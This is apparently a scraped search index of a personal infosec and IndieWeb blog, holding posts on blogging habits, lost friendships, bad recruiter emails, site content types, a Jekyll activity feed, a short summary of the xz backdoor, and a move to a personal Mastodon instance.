&amp; grammar run-through. Links: For those of you that are familiar with my writing portfolio, you know that I love to link to things - within the post jumping to sections, in other posts on my site and to external content. I link everything and everywhere. Supplementary information: Sometimes I find that a paragraph or section doesn‚Äôt completely convey what I wanted to say or it alone isn‚Äôt enough information for my intended audience. I tend to like to write to an audience who is more ‚Äúbeginner‚Äù, which means giving more background and context. So, if I find more info is needed, I will either write additional paragraphs for a respective section, or add appendices as needed. In many cases, I will just link to relevant content that I‚Äôve written elsewhere on the site. Graphics: A simple pass-through - would the section benefit from a graphic? If so, I make it and drop it in. References: For longer posts (and those which required some ‚Äúresearch‚Äù), I like to have thorough citations/references at the bottom. This requires superscripting throughout each section and having relevant, numbered links in an appendix at the bottom. Other stuff: This final pass-through is where I tend to fix things like my accursed habit of using ‚Äúit‚Äôs‚Äù when I should be using ‚Äúits‚Äù, among other things. Publishing: You can read more about my syndication strategy. There ya have it! That‚Äôs how I blog.

With fondness and regret, I look back at a life dotted with friendships made, and those forgotten‚Ä¶ Thanks to Apis Necros for inspiring me with their own original post on this subject. ‚ÄúVeronica‚Äù: In elementary school (I forget which grade exactly), we used to play kickball before class. One day, I got pegged in the face with the ball. It knocked the glasses off my face into the dirt and my nose bled. I cried and the kids laughed. ‚ÄúVeronica‚Äù (Her name definitely started with a ‚ÄúV‚Äù, but it could have been something else) instead picked up my glasses and asked me if I was OK. We weren‚Äôt ever friends, either before or after that day, but I‚Äôll always remember how she was nice to me in that moment. The ‚ÄúBoys in Black‚Äù: Way back in 4th/5th grade there was a group of maybe 3 of us who called ourselves the ‚ÄúBoys in Black‚Äù, i. e. ‚ÄúBiB‚Äù (inspired by the ‚ÄúMen in Black‚Äù movie). I don‚Äôt remember how we came up with this, or to what extent any one of us loved that movie so much that we‚Äôd name our group after it, but yeah. It‚Äôs funny too because thinking back, wearing black was not part of what we did at all. We would hold (daily?) meetings in class to discuss something, but mostly we spent our time doodling ‚Äúbases‚Äù and fantastical weaponry / vehicles-of-war (e. g. jeeps, tanks, etc‚Ä¶). I suppose we liked (as many young boys/children probably do) the idea of having a secret base filled with cool gadgets and lasers. In that group, was another kid whos name I don‚Äôt remember, but I do recall that his birthday was the day after mine. We used to observe that my birthday was the final day of Winter and his the first of Spring. That meant something to us. To the BiB! Leanna: My family and hers were incredibly close growing up, even into the later years of our childhood (i. e. highschool). We went on family trips, went camping, I even went to some highschool dances with her. Our parents would joke about us dating but we were always just friends. I still have vague memories of going to her family‚Äôs townhouse (in Lakeridge?) and hanging out in the basement with their dog Zelda and her two sisters (Victoria and Alexandra). In what is somewhat of a small-world-style twist, she ended up getting married to another past friend of mine from a separate circle (James, who I knew from Boy Scouts). I still think about the two of them and her family from time to time. I could probably reach out, but I never do. I hope they‚Äôre all doing great! Amy: Amy was, for a time, my best friend. In the days before the Internet took off, or cell phones were a thing, we would talk for HOURS on the phone, about anything, about whatever teenage kids in the 00‚Äôs had to talk about. One day, it just faded away and we stopped talking. I still don‚Äôt know why. Galileo: Zak, Aaron, Johnson, Sean, my fellow 7th floor Galileo engineers at VT. For the better part of 4 years they were my friends, classmates and those I spent my days with. We had some good times and I suppose some not as good times. I sadly don‚Äôt talk to them anymore. I‚Äôve seen some occasional things on LinkedIn, in the days I bothered to go on LinkedIn and see what they were up to. It would be cool to catch up one day, see where their lives had taken them, meet their families, their kids. Ya never know‚Ä¶ Kenny: For nearly 5 years me and Kenny sat next to each other and did our best to stay busy. We worked at a large, well-known defense contractor. We were work friends and even had the rare meetup outside of work. Most memorable to me though is the weeks we spent painting/coloring/decorating these little troll figurines to look like various Marvel/DC super heros. Silly times. Destiny 1, Raid Crew: Oh man did I love playing Destiny back in the day. I was a big time Halo addict back in the Halo 2/3 days and Destiny was no different. I played a lot of PVP via matchmaking but I also did a lot of raids (VoG anyone?) with a specific crew. We got along great and I remember they thought I was pretty funny. One day I just stopped playing and that was the end of an era. Destiny 2, Stadia &amp; the Salvations Clan: Years after D1, Destiny 2 came to Stadia and I got really into the franchise once more. I played on ‚ÄúStadia‚Äù, Google‚Äôs game streaming platform and it was a really great experience, and also a very small (relatively speaking) community. We all seemed to generally know each other and get along, chatting amongst ourselves across a few Discord servers and Reddit subs. Eventually I joined the ‚ÄúSalvations‚Äù clan with my brother, someone who went by ‚ÄúPolitics‚Äù (who was very good) and a number of others. I also played with someone named ‚ÄúTime‚Äù who was very good with the bow. My ‚ÄúArbalest‚Äù skills were legendary amongst the Stadia crew and boy did I have fun playing. Eventually life, family and other priorities became too much for me to afford the time needed to keep up with the game though. So much like what happened with D1, I pretty much vanished one day (and eventually Stadia too met its end. ) Pickup Ballers: Over the years I‚Äôve ran pickup bball with a number of different groups of guys. In each era, I‚Äôd play several times a week, for several hours each day. We came to know each other by name and we knew each others style of play. When I moved, or switched gyms, there were never any goodbyes. I just stopped going one day. In rare cases I would run into someone at wherever my new place that I would play, but generally, I just never saw them again. Another example, in a long string of examples of very situational friendships. Shoutout to the Courtland Towers crew - Paul, Leo, Eric, Steve K, Steve J, Derek and others whos names escape me. My stories aren‚Äôt particularly unique. Everyone has similar tales of friendships made and lost. It is just the nature of our shared experience as humans. I will admit that I am particularly bad at keeping in touch and surely what could have been longer-lasting relationships have suffered because of it. I also have a notoriously bad memory in terms of remembering anything from more than like 5 years ago, so there are likely countless other meaningful friendships that have been completely lost, even in memory. For those in my past, mentioned or not mentioned here that ever wanted to reach out, do it! " }, { "id": 53, "url": "https://shellsharks.com/roasting-recruiter-emails", "title": "HIRING::::URGENT!::SECURITYSPECIALIST:::REMOTE", "body": "2024/05/03 - If you are in the tech space, you are probably accustomed to the daily barrage of poorly formatted and eye-gougingly styled job emails from tiny recruitment shops. What is up with those? Why are they so bad? Take for example, what you see below‚Ä¶ OK, yeah‚Ä¶ wow. Rough on the eyes right? To be transparent, this is NOT an actual email I‚Äôve received, it is instead something I crafted where every bizarre formatting, style and language choice was taken directly from, or heavily inspired by, an email I have received in literally the past 3 days or so. I‚Äôve just decided to mush all of these oddities into a single email for comedic effect. So let‚Äôs go ahead and roast it a bit‚Ä¶ Too often they‚Äôre either not bothered to address the email to me, get my name wrong or have something generic like ‚ÄúCANDIDATE‚Äù. Weird ellipses in places they‚Äôre not called for. 2+ exclamation points in random places. Things are just highlighted at random, often with different colors throughout. Oh and the dark mode version of these emails is even MORE illegible. Multiple font types, font sizes, line spacing, font weights, you name it‚Ä¶ Crazy amount of white space inbetween sections. Plenty of language follies. (I really mean no offense here to non-native English speakers. I understand the difficulty of learning a second language, but in a setting where you are catering to an english-speaking candidate pool, getting this right could go a long way in making these emails seem more legitimate &amp; professional) ‚ÄúI came to you regarding one of my job position‚Äù ‚ÄúWe are looking for Engineer Please review below job description‚Äù ‚ÄúIf you are interested then please share me your resume‚Äù Text is tabbed out in random ways. Table like formatting with incredibly inconsistent margins. ‚ÄúRemote‚Äù roles that are also onsite? Scary bolded red lines for VISA requirements. Section headers are inconsistently styled. Lists with bullets, lists without bullets, lists with two different kinds of bullets, blank list items. Whatever this is ‚Äì&gt; ‚Äú??????Required????5?????Years‚Äù, at the end of list items. and ya gotta love those signature blocks. I don‚Äôt want this ‚Äúroast‚Äù to come off as mean-spirited. Having actually worked with some of the folks behind these emails, I can assure you that they are in many cases, real people, real recruiters, recruiting for real jobs at real companies. They are, like the rest of us, trying to make a go of this crazy world. But! It‚Äôs wild to me that these emails get crafted, whether by hand or by some cursed automation somewhere and then sent, likely en-masse, to people like myself in the hopes that we‚Äôll be encouraged to respond. I suppose if you‚Äôre out-of-work or dangerously curious (as I often am) you‚Äôre willing to entertain even the wackiest of job propositions. These just straight-up don‚Äôt pass the eye test though. Since I know for a fact that there is some subset of these emails that are legitimate, they must be interested in improving their response rate for potential candidates right? As such, it wouldn‚Äôt take much to clean these up and make them A LOT more palatable. So why do they continue to look like this? Is no one helping them? Do they have individuals who work at these companies who actually look at these emails, then just nod and say ‚Äúlooks good to me!‚Äù? So here‚Äôs my plea to these recruiting agencies. Pick a font. ONE FONT. Pick a font size. No highlighting. Easy on the white space. Stop capitalizing things at random. Simple sections with bulleted lists is fine! Proofread, just a little. Make sure you get my name right, or a simple - NORMAL! - greeting is fine (e. g. ‚ÄúHello‚Äù). I promise this will improve take rate, and spare my eyes a bit in the process. Thanks for reading! " }, { "id": 54, "url": "https://shellsharks.com/multiplicity-of-writing", "title": "A Multiplicity of Writing", "body": "2024/04/09 - On this site, I write and publish in a variety of different forms, each serving their own unique purpose. I want to describe what these different content types are and how / why I use them across the site. Multiple different post types is an important characteristic of an IndieWeb site. Elsewhere, I cover my approach to syndication (i. e. POSSE / PESOS), whereby I attempt to capture &amp; publish as much as I can that I post around the web here, directly on my site. Content Types: My writing here is published in a variety of different formats with different purposes. A list of these formats is provided below. Notes Captain Logs Posts Podcasts Devlogs Links Scrolls Other PagesIdeally, these post types will all be aggregated and displayed chronologically in the Activity feed. Notes: Notes are an IndieWeb concept for short-form posts, typically sourced from, or syndicated-to, micro-blogging platforms such as Mastodon or Threads. I use notes in the following ways‚Ä¶ A repository for reverse-syndicated social media (microblog) posts (i. e. Mastodon) Other types of short-form content (typically &lt;1000 characters)So when does a social media post qualify as something I want to archive on my site as a note? To be honest, it‚Äôs somewhat subjective and there is no clear methodology. If I think it is something that I tend to repeat, I will likely try to capture it so I can just share a link to the note in the future. If it is something that becomes noteworthy from a virality or engagement perspective (i. e. receives a lot of comments, boosts, likes), I might capture it as a note. For responses to posts that would require &gt;500 characters, I may capture it as a note and then link to it in my social media reply. There is a conscious decision to NOT capture EVERY public post/reply as a note on my site as that would be A. cumbersome and B. of little future value. My site is as much, if not more, a reference for me as it is a place where others can read my writing. As such, memorializing everything I post out on the web is just not useful to index. Notes tend to be my most-used content type and a place where I feel more uninhibited in terms of what I write about. As an example, in my NaBloPoMo 2023 series, I captured most of my writing as notes, and the subjects I wrote about were as a majority, non-tech and non-infosec. In this way, I can avoid cluttering my more presitigious, long-form, traditional blog post feed. Notes live in the ‚ÄúNotebook‚Äù, which I‚Äôve styled to look much like a social micro-blogging feed/timeline. Each individual perma-linked note has also been styled to look like a social media post complete with avatar, @ handle, etc‚Ä¶ I‚Äôve even devised a way to display social-media-post-style ‚Äúcards‚Äù inline throughout my site. One such card is shown below. Mike Sass@shellsharks 11/17/22 08:11 ‚ÄúIf you find yourself alone, riding in green fields with the sun on your face, do not be troubled. For you are on Mastodon, and not on Twitter!‚Äù - Mastodonius Decimus Meridius #Gladiator is the best movie of all time. I can‚Äôt be convinced otherwise. 45 Metatext Syndication: #life #movies Captain Logs: The Captain‚Äôs Log is essentially a personal journal/diary. It is very informal and covers a range of more personal topics such as what I‚Äôm learning, gadgets, fitness, TV/movies, gaming, investing, parenthood, traveling, and life in general. I also tend to have other Shellsharks community/site meta-commentary. Some of these topics are captured in the more ephemeral /Now page, but the logs themselves serve kinda as /then views (a /then is an idea for archiving /now pages at specific points in time). Captain‚Äôs log entries are published monthly as digests without too much structure beyond some sections and bulleted lists. These logs allow me to revisit previous months of my life to remember what I was up to and for anyone out there who wants to get a little more personal perspective on me, that‚Äôs available. I‚Äôve been journaling in this way since March 2021! Log entries are somewhat boringly displayed in a bulleted list on the main /captains-log page. Posts: Posts are traditional, long-form content featured on the main page of my site in a paginated view. Much like notes, topics can include pretty much anything (i. e. Infosec, Technology, Life), but they tend to be more structured and well-researched. I find myself waffling sometimes on whether something I publish should be a note or a post and I‚Äôm sure I‚Äôve ‚Äúnoted‚Äù things that honestly should have been ‚Äúposted‚Äù. In the end, it probably doesn‚Äôt matter much but since notes and posts live in separate RSS feeds and notes haven‚Äôt traditionally been included in the main page feed* they may ultimately have less public exposure. *Note: The first item in that home page list is in fact my most recent note! Podcasts: Podcasts are pretty self-explanatory. For now, all podcast episodes are captured on the site on a single page in a bulleted list. They are hosted on Podbean where you can find links to individual episodes, RSS feed, etc‚Ä¶ I‚Äôd like to make some changes in the future to how I display and archive Podcast episodes on the site. First, I‚Äôd like to capture podcast episodes/records as individual files in a Jekyll collection. This way I can more programmatically populate the /podcast main page with each episode. Further, I would like to move away from Podbean to a more self-hosted, Fediverse-native podcasting solution. More on that to come! Devlogs: Devlogs are intended to be a very specific post type where I exclusively write about my journey in working on and developing this site and any related properties (podcast, Fediverse instance, etc‚Ä¶). I feel Devlogs need a separate, isolated space as the audience for this particular type of content is somewhat niche (e. g. IndieWeb fans, hobbyists, bloggers, etc‚Ä¶). They will also serve as a useful reference for myself as I often forget how/why I did something on my site. I am notoriously bad at saving useful articles, documenting my site and leaving comments within my code. [*] Links: Links are a simple way for me to share links to articles/sites that I think are cool. I‚Äôve seen other indie sites do this and I love the idea of making my site more social and interconnected, while also promoting good stuff I discover as I surf the wider Internet. Scrolls: Scrolls is a weekly newsletter / link roundup / information digest at the intersection of the IndieWeb and the Fediverse, with a splash of Cybersecurity stuff. It is published on the web every Sunday, completely free. Check out the latest edition and get scrollin‚Äô! Other Pages: I also share some things on this site in a more ephemeral page-based way, rather than publishing within a collection. Some examples‚Ä¶ Changes: A loooong list of minute changes to the site, sectioned daily. /Uses: Stuff that I use. /Ideas: Ideas that I have. /Now: What I‚Äôm up to now. Blogroll: Blogs/sites I enjoy. &gt;Shark Week: A once-a-year, week-long stream of content from your favorite mildly-shark-themed infosec / tech / everything blog, coinciding with actual shark week. Some other even more auxiliary things can be found by perusing the hamburger menu on my site. There‚Äôs a lot there so definitely take some time to click around and explore! " }, { "id": 55, "url": "https://shellsharks.com/creating-an-activity-feed", "title": "Creating an Activity Feed with Jekyll", "body": "2024/04/09 - In my effort to IndieWeb-ify my site, I‚Äôve created a unified Activity feed which aggregates traditional posts, notes, captain logs, changes (and more in the future) into a single, chronological timeline. [1] I‚Äôd like to thank the following individuals for helping inspire my Activity feed! Molly White Jason Kottke Aaron PareckiOK, so how did I make this using Jekyll? The first version of the Activity feed relies heavily on leveraging the Jekyll concept of ‚ÄúCollections‚Äù. Future versions of this feed may pull in content from additional places around the site &amp; beyond using other mechanisms. First, I needed to get all of my various collections (i. e. notes, logs, posts, etc‚Ä¶) into a single array. The code below uses concat to do just this. site[collection. label] translates to site. notes, site. posts, etc‚Ä¶ {% for collection in site. collections %} {% assign content_array = content_array | concat: site[collection. label] %}{% endfor %}Following this, I needed to chronologically sort the aggregate array. {% assign content_array = content_array | sort: date | reverse %}To handle different styling for different content types, I created an If/Else structure which iterates through the chronologically sorted content array setting some different variables for each type of content. For example, for records in the Activity feed that are ‚Äúnotes‚Äù, they will have a different icon, different ‚Äúverb‚Äù and different way to express the inline content summary. It determines content type by looking at the collection value for each item in the content array. {% assign post_type = %}{% for item in content_array %} {% assign post_type = item. collection %} {% if post_type == notes %} {% assign icon = ph ph-note %} {% assign verb = Noted %} {% assign content = item. excerpt | strip_html | strip_newlines | truncatewords: 50 %} {% elsif post_type == captain_logs %} {% assign icon = ph ph-notebook %} {% assign verb = Logged %} {% assign content = item. excerpt | strip_html | strip_newlines | truncatewords: 50 %} {% elsif post_type == posts %} {% assign icon = ph ph-article %} {% assign verb = Posted %} {% assign content = item. description %} {% else %} {% assign icon = ph ph-chat-text %} {% assign verb = Shared %} {% endif %}Finally, I need to create the structure for each record in the Activity feed. The code snippet below demonstrates this div which houses some inline styling info for per-content-type aesthetics, Liquid syntax for pulling content record-specific URL, title, description, publish date, etc‚Ä¶ &lt;div class= item style= border-color: var(--{{item. collection}}-color); background-color: color-mix(in srgb, var(--{{item. collection}}-color) 7%, var(--background-color)); &gt; &lt;span class= verb &gt;&lt;i class= {{ icon }} &gt;&lt;/i&gt; {{ verb }}:&lt;/span&gt; &lt;h3&gt;&lt;a href= {{ item. url }} &gt;{{ item. title }}&lt;/a&gt;&lt;/h3&gt; &lt;div&gt;{{ content }}&lt;/div&gt; &lt;span class= date &gt;&lt;i&gt;published&lt;/i&gt; {{ item. date | date: '%B %e, %Y' }}&lt;/span&gt;&lt;span class= syndicate &gt;{% if item. syndicate-to %}&lt;i class= ph ph-broadcast title= Syndication &gt;&lt;/i&gt; {% for dest in item. syndicate-to %}{% if dest. url %}&lt;span style= padding:0px 5px 0px 5px; &gt;&lt;a href= {{dest. url}} &gt;{% if dest. icon %}&lt;i class= {{dest. icon}} title= {{dest. name}} &gt;&lt;/i&gt;{% else %}&lt;i class= ph ph-share-network title= {{dest. name}} &gt;&lt;/i&gt;{% endif %}&lt;/a&gt;&lt;/span&gt;{% endif %}{% endfor %}{% endif %}&lt;/span&gt; {% if item. tags %}&lt;div class= tags &gt;{% for tag in item. tags %}&lt;span&gt;#{{tag}}&lt;/span&gt; {% endfor %}&lt;/div&gt;{% endif %} &lt;/div&gt;NOTE: Not described here is some of the more unique on-page CSS styling and the (very similar) div block I created to pull in the latest Changelog list. Future Versions: I have some ideas for what other types of content I may pull into this feed in the future‚Ä¶ I‚Äôd like to introduce a new type of content, a ‚Äúdevlog‚Äù - featuring specific writeups on exactly how I make changes to this site. Podcasts: I need to convert my podcast entries into a collection format. Oh and get Podcasting again! I‚Äôm toying with the idea of converting my gargantuan changelog page into a per-day or per-week collection format. Bringing in /Now (or /Then) content.

However, if you want a quick readout, here‚Äôs what I‚Äôd say‚Ä¶ There was a supply-chain compromise in a very widely used compression library (xz/liblzma). The compromise was (very luckily) detected early which mitigated the risk of the introduced vulnerability. The vulnerability notably manifests in OpenSSH, the risk (if unpatched) appears to be full RCE of affected SSH servers. The attack chain used to infiltrate the package repo and stealthily insert the backdoor is reminiscent of state-sponsored actors. No other attempts at attribution have been made to my knowledge. Investigations into the malicious code are on-going. Vendors have released notices and it is advised to check what version you are running and upgrade/downgrade as necessary. Related Reading David A.

But how did I get here? Like many other people who find themselves at least mildly online (or chronically so, as I do), I am a steady user of (a variety of) social media platforms. When Twitter fell, the world of social micro-blogging fractured, with people fleeing across the Internet to a number of platforms, both new and old. For my part, I took up residence on Mastodon, specifically, a cybersecurity-themed instance - infosec. exchange. (I also re-logged into my long dormant mastodon. social account. ) Infosec. exchange was perfect for what I was looking for. I used Twitter mostly as a place to follow others in the infosec/tech industry and infosec. exchange was the choice landing spot for many other disaffected infosec-Twitter refugees. There I re-found my people but also became a more active member of the community, sharing posts, interacting with others, etc‚Ä¶ In the time I spent on infosec. exchange (since November 2022 until recently) I acquired a deep interest not only in the possibilities the Fediverse provides but also in the concept of the IndieWeb. So this move to shellsharks. social is a direct result of the confluence of my newfound loves - the Fediverse &amp; the IndieWeb. What was borne from that is the idea of ‚ÄúIndieSocial‚Äù * shellsharks. social is not exactly single-account, but it is ‚Äúsingle-user‚Äù (just me) IndieSocial: Extending the IndieWebYou can think of the concept of ‚ÄúIndieSocial‚Äù as a combination of principles from both the Fediverse and the IndieWeb. Consider a social presence that is‚Ä¶ Personally owned (the content and server) Ad-free Decentralized Social (duh)My foray into the IndieWeb has been great success. I‚Äôve leaned into its ideals as much as is technologically (and philosophically) feasible for my statically-generated site. But where it excels at hosting my content and being a centralized, permanent place for my identity &amp; content on the web it falls short in its ability to truly connect me with others in the way a traditional social media platform can. My latest stint on Mastodon / infosec. exchange succeeded in connecting me with others who value what I have to share on my site, but my identity being tied to a handle on infosec. exchange was limiting in that I ultimately did not own my posts nor my branding, and though I do mostly post about infosec stuff, it had a quasi-pigeon-holing effect due to the instance moniker itself (infosec. exchange). I would often see people on Mastodon responding from unique, single-user instances that served as a badge of authenticity and I coveted that. And though no one on the Fediverse could ask for a more thoughtful and capable server owner than those on infosec. exchange, I always wondered would would/could happen if/when Jerry decided to hang it up. More and more I started to think, much like what I‚Äôve captured with my site, I need to own my own social. Only then could I begin to post uninhibited by expectation, allowing myself to be uniquely me. Two big inspirations for me with regard to the IndieWeb and a web-based identity are Joan Westenberg and Cory Dransfeldt. Benefits of a Personal Fediverse InstanceBeyond the benefits of Mastodon (and the Fediverse at large), what benefits are there to running your own Fediverse instance? A more perpetual, authentic identity on the web, i. e. the aforementioned ‚ÄúIndieSocial‚Äù Vanity Fediverse handle (e. g. ‚Äú@shellsharks@shellsharks. social‚Äù) Branding: For individual creators and business, having a social identity hosted on a domain which has personalized branding is very important. Deplatforming resistance: Since you are the instance admin, you can not be deplatformed. Only your ISP or hosting provider could effectively do this and this is quite rare. Mitigate localized censorship: On a community instance, admins and moderators can censor your posts. Data ownership: As an admin, you have control over data exports and lifecycle. Customization: Instance admins can customize the CSS of their site, relays, emojis, trending, etc‚Ä¶ Spontaneous server death: Instances have died in the past due to database corruption, domain seizure, admin burnout, lack of funding and more. Avoid this by running your own instance. Defederation control: Though users on a community instance have a lot of power in self-moderation, some controls for isolation and defederation are only available at the administrative level. Hosting: Challenges, Choices &amp; ChronologyOK, so I knew I wanted to ‚Äúown my own social‚Äù, and for me, this meant having my own Fediverse server of some flavor (e. g. Mastodon, Akkoma, IceShrimp, GoToSocial, etc‚Ä¶). Because of my affinity for the iOS client Ivory, I decided Mastodon would be the best fit (Ivory only works with Mastodon at this time). From my research I knew Mastodon to be on the trickier &amp; more resource-hungry side of the Fediverse platform spectrum. In terms of hosting, I first had to decide between managed or self-hosted. Masto. host was one managed Mastodon-hosting platform that I heard a lot about and seemed quite reliable so I decided to put a small alt account (@afterdark) there on an instance ‚Äúshellsharks. social‚Äù to test it out. The base tier (‚ÄúMoon‚Äù) was very slow and even with only a single-user with &lt;30 followers and only 1 follow it was achingly ill-performant. I wasn‚Äôt terribly impressed but knew by sizing up a tier or two it would likely be better. The ideal situation of course would be to gloriously self-host and administer the entire stack. I learned a few things from having put together some resources on Mastodon instance administration and following along over the last year or so as other instance admins grew their communities. I had some understanding of the architecture of Mastodon, I knew some pitfalls of ActivityPub-based federation and I knew Hetzner was a popular hosting provider to get a cheap, reliable VPS. So with all that, I just went for it. I created my Hetzner account, initialized a decently spec‚Äôed VPS, I got my SMTP relay configured through Sendgrid, set up a Backblaze R2 bucket for block storage, fronted through Cloudflare and then hammered through the official Mastodon installation steps (paired with some other installation guides I came across). I knew it wasn‚Äôt a simple install, but it seemed straight-forward enough. I ran through the installation wizard but despite my confidence, things started to awry. Somewhere between the server-side install config and the SMTP-relay config something wasn‚Äôt working. I wasn‚Äôt receiving my confirmation email to log into the Mastodon admin account I created. I bypassed this little issue by manually activating the account on the back-end using tootctl. So now I‚Äôm in my sparkly new instance! But wait, nothing appears to be federating and I am unable to search for or find any other accounts! I searched around for a bit on Google for any clues as to what might be happening but after an hour or so decided to shut it all down and try a different path. Interestingly, after I started deactivating some accounts and tearing down the VPS infrastructure I noticed the emails finally making it through the SMTP relay! I also have a theory that federation/search was borked because I had not properly set up the object storage connection. So where did I turn? I needed something at least slightly more turnkey. DigitalOcean has advertised a ‚Äúone-click‚Äù droplet for Mastodon hosting that seemed appealing and for a moment I considered going that route. But, it still required a fair bit of set-up including hooking up a SMTP relay, object storage, etc‚Ä¶ Oh and it was 4-5x the cost (at least) of going back and figuring out how to do it with Hetzner. It was moments after I created the DigitalOcean account and started thinking more about it when I decided to just scale up my existing shellsharks. social instance on Masto. host and evaluate whether it could handle an account with activity on the order of what I typically see with my main shellsharks account on infosec. exchange. Masto. Host Trial Period: Issues &amp; Observations: Masto. host is incredibly easy to get started with, scale up/down or stop using entirely. As such it was a simple decision (in the end) to trial my main account with it. After sizing up my existing shellsharks. social instance from the Moon to Star tier it didn‚Äôt take long for me to see that it would be plenty beefy for an account of my size. Since the pricing is plenty all-inclusive (you don‚Äôt need to futz with object storage, SMTP relays, CDNs, etc‚Ä¶), with all underlying server management handled entirely by Masto. host, I was pretty sold on the idea of moving there. Though the instance itself seemed more than performant, I did encounter a number of other things worth mentioning‚Ä¶ A few notes on Masto. host itself‚Ä¶ It is scary easy to get signed up and started with an instance with your choice domain‚Ä¶ Pricing, imo, is very fair. Once you add up all the various costs of self-hosting you really don‚Äôt save much from a price perspective by going elsewhere. For what you save in time, I think it‚Äôs very worth it. Support is lightning quick and very helpful. Managing your instance via the Masto. host admin panel is extremely simple. Really not that much to tweak. Media storage allottment gets gobbled up pretty quick. I‚Äôm at 70% after only a few days. Will have to report back to see how I can manage this into the future‚Ä¶ Federation is a tricky beast and I definitely could not explain how it works. What I can say is that on any Mastodon account, your view of the world/Fediverse is not necessarily 100% complete. On larger instances you will likely see more comments and have access to more accounts than you will on a smaller, ‚Äúless federated‚Äù instance. As such, when viewing user accounts from my personal instance I have only limited information that gets pulled in. I see avatars, follow/follower counts and lists and some posts but likely do not see all of them. To address this shortfall, I can typically go to their account directly on their server via my client‚Äôs in-app browser, scroll through their posts and if there‚Äôs one I want to engage with, copy the link to the post and search for it directly within my Mastodon client. This 99% of the time will allow me to view the post directly and engage. I occassionally will have a performance hiccup, i. e. something loading slow, but after few days using my account pretty heavily I‚Äôd say it‚Äôs fine 99. 9% of the time. As an example, notifications (likes, replies, boosts) all come in super fast! One thing I really enjoyed being on infosec. exchange was the Local feed. It was a great place to farm interesting accounts, find one-off posts to engage with, etc‚Ä¶ Luckily, Mastodon still allows me to peruse local feeds and as such it is easy enough for me to continue scrolling it and just respond via my new account instead. Ivory doesn‚Äôt yet allow me to browse remote local feeds but what I can do is peruse the infosec. exchange local feed on my old infosec. exchange account and just reply from my shellsharks. social account via the account-picker. Search, which honestly is of varying usefulness even on the largest of servers (i. e. infosec. exchange / mastodon. social), is effectively useless on my personal instance unless I have a direct link to exactly what I am looking for. This has improved over the last few days a bit, but I still wouldn‚Äôt rely on basic search on my personal instance to find anything useful. A Look at shellsharks. social &amp; the FutureSo yeah, I‚Äôm @shellsharks@shellsharks. social now. Yay! The migration process from infosec. exchange was pretty good, definitely a bit scary but it was mostly a success. I had a little under 1600 followers to migrate and only had 20-30 of those not get moved over after it was all said and done. This seems to be an issue with hitting a rate-limiting wall either with my server or infosec. exchange. Fortunately, I can re-initiate the move in 30 days and migrate over the straggling followers. I had some questions about how account moves worked but this post sums things up pretty well. I had considered using my ‚Äúshellsharks. com‚Äù domain as my Mastodon instance but after some thinking, decided that shellsharks. social would be best. First, it is a social account, so having the social TLD makes perfect sense. Second, I was concerned about traffic that might be generated due to noisy ActivityPub federation calls which would be directed at shellsharks. com which is sitting on Github Pages and perhaps not ready for that level of traffic. The biggest downside of having made this move, and using Masto. host is no longer having the Glitch-soc capability which allowed me to have posts that exceed 500 chars in length. This said, I‚Äôve sorta decided that if I can‚Äôt get my point across in 500 characters, it might be worth making a note or blog post on my site and then sharing a link to that instead. This is part of the spirit of the IndieWeb after all! In the future, I‚Äôd like to retry self-hosting. So much of the Fediverse is hosted by Hetzner so I would probably choose that as my VPS provider. I‚Äôd like to go with a Docker-based install, for easier management and technological gratification. In fact, there is a lot of things I‚Äôd like to self-host in the future (e. g. RSS, bookmarks, blog, etc‚Ä¶). I may even have some ideas for a community-style server, but that‚Äôs a ways away. The world of social media has in some ways gotten so much larger while at the same time somewhat more disconnected as people have spread out across the various platforms of this era. But things have been set in motion to bridge these divides and bring people together once more. In a near future where those of us in the traditional Fediverse can interact with those on Threads, or on BlueSky, or on Nostr, or wherever, I really liked the idea of establishing my unique, forever-social-identity within the Fediverse. Regardless of where I am now or where I go in the future, you should always be able to @ me on the Fediverse by @‚Äôing @[whatever]@shellsharks. com. Through the magic of Webfinger, this will redirect ActivityPub messages to my current main Fediverse account. Cool stuff! Many thanks to Masto. host for making this possible and so painless! Accounts: Here‚Äôs a quick breakdown of the accounts I have planned for shellsharks. social and how I‚Äôll be using them. shellsharks@shellsharks. social - My main account. afterdark@shellsharks. social - Late-night sillies, shit-posting, meta-commentary. Site@shellsharks. social - I am considering standing up an account that simply posts updates that are made to the site. mike@shellsharks. com - Reserving this name in the event I want to migrate my ‚Äúgeneral‚Äù account from mastodon. social. Thanks to infosec. exchangeI know this post is about where I am now, but I think it‚Äôs worth waxing poetic about infosec. exchange for a minute. It was afterall, the incubator in which I became such a proponent of the Fediverse, learned so much about the IndieWeb and where I met literally 100‚Äôs of cool like-minded tech and infosec people. If you are in infosec (especially), I can‚Äôt recommend a place to be social more than I would recommend infosec. exchange. Though there are some other infosec-related servers out there, (and they are in their own right great) there is no comparison to infosec. exchange. Jerry Bell, the owner, admin and proprietor of infosec. exchange (and a ton of other Fediverse properties) is (and I‚Äôve said this so many times over the last year+) mind-bogglingly attentive, extraordinarily compassionate, technologically gifted (I mean his ability to run so many Fediverse servers blows my mind), and honestly seems like a really nice person (I‚Äôve not had the pleasure of meeting him). He‚Äôs created a very welcoming space and is always looking at how to improve server performance and keep the community happy and engaged. It is so great in fact, that I still fully scroll the infosec. exchange Local feed multiple times a day to find new things to engage with and new people to follow. My old account (though it has a moved-to/redirect) is still there and you can peruse my year+ worth of posts if you wanted to see how much fun I had in that time. (Alternatively I have turned my toot archive into a scrollable page. ) So I'll just say, Thanks for everything Jerry. Your hard work in bringing the Fediverse to so many does not go unappreciated. üß°Some other random things/links A Mastodon installation guide I tried to use Find me using Webfinger An interesting discussion on using Mastodon‚Äôs ALTERNATE_DOMAIN Joan Westenberg on Self-hosting Your Site, Your Home, Your Web | Cory D GoToSocial We Distribute on why they made their own Mastodon instance" }, { "id": 58, "url": "https://shellsharks.com/syndication-strategy", "title": "Shellsharks Syndication Strategy", "body": "2023/11/20 - The IndieWeb movement is here and I‚Äôm fully* onboard. Without repeating a lot of what I explain in my IndieWeb intro post, the IndieWeb essentially describes websites operated by individuals where they own their content rather than having content held captive within typical large tech platforms. One of the big concepts of IndieWeb is syndication, i. e. cross-posting content on your site to other destinations/platforms/social networks. Because it‚Äôs great and all to have your content available at your site, but if you want true reach, you need to bring your content into the walled gardens of big social networks where most people are. There are two approaches to syndication POSSE (Post Own Site Syndicate Everywhere) and PESOS (Post Everywhere Syndicate Own Site). With POSSE, you post on your site first and then syndicate everywhere you want to cross-post and with PESOS your using your networks as you traditionally would but replicating content back (i. e. reverse syndication) to your site to maintain a copy. Easy enough to understand! The Vergecast actually ran an episode recently, ‚ÄúThe 